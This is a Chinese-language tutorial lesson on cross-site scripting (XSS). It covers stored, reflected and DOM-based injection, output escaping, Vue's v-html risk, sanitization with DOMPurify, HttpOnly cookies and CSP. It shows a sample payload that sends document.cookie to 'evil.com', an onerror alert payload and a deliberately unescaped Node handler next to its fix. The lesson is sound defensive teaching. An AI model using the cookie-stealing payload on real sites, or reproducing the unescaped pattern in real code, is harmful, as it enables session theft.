---
id: l-sec-xss
slug: sec-xss
title: XSS：把用户输入当代码执行的事故
difficulty: 3
estMinutes: 40
tags: [安全, 前端]
summary: XSS = 攻击者的数据混成了你的代码——分清三种注入点，记住「输出转义 + 框架默认安全」，v-html/innerHTML 是最危险的入口。
updated: 2026-11-22
resources:
  - id: r-owasp-xss
    title: OWASP · Cross Site Scripting (XSS)
    url: https://owasp.org/www-community/attacks/xss/
    type: doc
    difficulty: 3
    note: XSS 的权威分类与防御清单。
  - id: r-mdn-csp
    title: MDN · Content Security Policy
    url: https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP
    type: doc
    difficulty: 3
    note: 纵深防御的兜底手段：限制脚本从哪来。
---

> 一句话定义：XSS（跨站脚本）= 攻击者把**恶意脚本伪装成数据**存进你的页面，其他用户的浏览器把它**当代码执行**——偷 Cookie、伪造操作全从此来。

## 概念讲解

正常流程里，用户输入是「内容」：评论区写 `今天天气不错`。XSS 的攻击是把输入写成代码：`<script>fetch('evil.com?cookie='+document.cookie)</script>`。页面原样渲染它，浏览器分不清这是内容还是程序——**数据和代码的边界被打破**，就出事。

三种注入场景（理解「数据从哪进来」比背类型重要）：

1. **存储型**（最毒）：恶意评论存进数据库，每个打开该页的用户都中招；
2. **反射型**：恶意参数在 URL 里（`?search=<script>...`），诱导用户点链接才触发；
3. **DOM 型**：纯前端问题——JS 把不可信数据直接塞进 `innerHTML`。

防御的核心思想一句话：**永远不要相信用户输入，输出到页面时按上下文转义**。现代框架（Vue/React）默认转义插值，这就是框架「默认安全」的价值——你要做的是别从后门绕出去。

## 代码示例

同一需求的安全版与危险版对照（Vue）：

```vue
<script setup>
import { ref } from 'vue'
const comment = ref('<img src=x onerror=alert("XSS")>')
</script>

<template>
  <!-- ✅ 默认插值：自动转义，原样显示文字，不会执行 -->
  <p>{{ comment }}</p>

  <!-- ❌ v-html / innerHTML：把字符串当 HTML 渲染，onerror 被执行 -->
  <p v-html="comment"></p>
</template>
```

后端旧系统仍在拼 HTML 时的等价危险与修复（Node 为例）：

```js
// ❌ 危险：字符串拼接直接输出
res.send(`<div>${req.query.name}</div>`)

// ✅ 修复：输出前按 HTML 上下文转义
import escapeHtml from "escape-html"
res.send(`<div>${escapeHtml(req.query.name)}</div>`)
// <script> 变成 &lt;script&gt;，浏览器显示文字不执行
```

真正的富文本需求（用户要写加粗、标题）怎么办？**白名单过滤**而不是黑名单：用 sanitize-html / DOMPurify 只保留允许的标签，属性如 `onerror` 一律剥掉——「允许什么」比「禁止什么」可靠得多。

## 常见坑

1. **坑 1：以为「前端已转义」就万事大吉**。转义发生在**输出**环节且要与上下文匹配：进 HTML 上下文转 HTML 实体，进 JS 字符串上下文转引号，进 URL 上下文做 URL 编码——上下文错了照样注入。
2. **坑 2：富文本「自己写正则过滤」**。正则拦 `<script>` 拦不住 `<img onerror>`、大小写变体、编码绕过。用成熟的白名单库，别造轮子。
3. **坑 3：Cookie 不设 HttpOnly**。XSS 得手的第一件事就是 `document.cookie`——关键 Cookie 加 `HttpOnly`（JS 读不到）+ `Secure`，被注入也偷不走。呼应「认证授权」一课。
4. **坑 4：URL 参数直接进 innerHTML**。DOM 型 XSS 最常见的来源是 `location.search` / `location.hash`——它们同样是不可信输入。

## 小练习

1. 在 Playground/Vue 项目里复现 v-html 与插值的差异，用 `onerror=alert(1)` 验证转义是否生效。
2. 用 DOMPurify 过滤一段含 `<script>` 和 `<img onerror>` 的富文本，检查输出保留了哪些标签。
3. 思考题：CSP 响应头为什么能作为 XSS 的「最后防线」？它防的是哪一环的失守？
